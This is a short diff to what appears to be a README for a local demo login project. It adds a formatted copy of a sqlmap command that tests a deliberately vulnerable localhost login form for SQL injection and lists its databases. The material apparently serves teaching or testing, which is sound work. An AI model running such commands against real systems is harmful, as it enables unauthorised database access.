@@ -32,5 +32,5 @@ over data fetching from the database, to accessing the underlying file system an
 
 sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" --data="username=test&password=test" --dbs --batch
 
-
+<pre> <code> ```sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" --data="username=test&password=test" --dbs --batch ``` </code> </pre>
                                                                                            
